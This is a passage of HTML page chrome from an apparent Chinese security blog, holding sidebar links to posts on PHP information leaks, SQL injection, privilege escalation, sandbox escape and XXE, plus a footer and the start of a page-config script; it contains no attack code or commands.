href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/22/SQL/">SQL</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/07/XXE/">XXE</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">384k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">5:49</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
     ispost: true,
     path: `2026/05/19/常规外网打点/`,
     favicon: {
